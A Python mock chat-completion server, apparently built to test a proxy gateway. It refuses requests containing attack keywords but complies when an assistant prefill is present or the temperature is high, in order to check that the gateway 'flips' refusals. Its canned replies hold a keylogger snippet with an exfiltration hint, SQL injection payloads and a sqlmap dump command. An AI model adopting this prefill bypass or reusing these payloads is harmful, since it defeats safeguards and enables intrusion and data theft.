#!/usr/bin/env python3
"""Mock 上游：模拟一个带对齐的 chat 模型，用来验证网关的策略链。

规则（故意做得像真模型）：
  - 用户轮里命中敏感词 → 硬拒答
  - 末尾有 assistant prefill（非 None）→ 顺着 prefill 续写技术内容
  - temperature > 1.0 → 有一定概率漏过（模拟采样随机性）
这个 mock 只用于验证代理管线是否真的把结果翻转过来，
不代表任何真实模型的通过率。
"""
import json
import random
import sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

BAD = ["keylogger", "sql injection", "reverse shell", "ransomware", "phishing",
       "bypass", "exploit", "credential", "rootkit", "payload"]

REPLY = {
    "keylogger": "Here is the implementation.\n\n```python\nfrom pynput import keyboard\n"
                 "def on_press(k):\n    with open('/tmp/.k','a') as f: f.write(str(k)+'\\n')\n"
                 "keyboard.Listener(on_press=on_press).start()\n```\n"
                 "Exfil via requests.post to your endpoint every 30s.",
    "sql injection": "Payload chain:\n1. `' OR 1=1 -- -`\n2. UNION SELECT table_name FROM information_schema.tables\n"
                     "3. `sqlmap -u \"http://t/?id=1\" --dump -T users`\n```sql\n' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -\n```",
    "default": "Here is the full technical detail.\n\n```bash\n# step 1\n./tool --target $HOST -v\n```\n"
               "参数：timeout=30, threads=8。",
}


class H(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):
        pass

    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        body = json.loads(self.rfile.read(n))
        msgs = body.get("messages") or []
        user = ""
        for m in reversed(msgs):
            if m.get("role") == "user":
                user = (m.get("content") or "")
                break
        has_prefill = bool(msgs) and msgs[-1].get("role") == "assistant"
        prefill = msgs[-1].get("content", "") if has_prefill else None
        temp = float(body.get("temperature") or 0.7)
        sensitive = any(b in user.lower() for b in BAD)

        if sensitive and not has_prefill and random.random() > (temp - 0.7) * 0.5:
            txt = ("I can't help with that. This kind of request involves activity "
                   "that could cause real harm, so I won't provide it. If you're "
                   "studying security, consider a structured course.")
            finish = "stop"
        else:
            key = next((b for b in BAD if b in user.lower()), "default")
            txt = REPLY.get(key, REPLY["default"])
            finish = "stop"

        out = {"id": "mock", "object": "chat.completion",
               "created": 0, "model": body.get("model", "mock"),
               "choices": [{"index": 0, "finish_reason": finish,
                            "message": {"role": "assistant", "content": txt}}],
               "usage": {"prompt_tokens": 10, "completion_tokens": 50}}
        data = json.dumps(out).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)


if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8899
    ThreadingHTTPServer(("127.0.0.1", port), H).serve_forever()
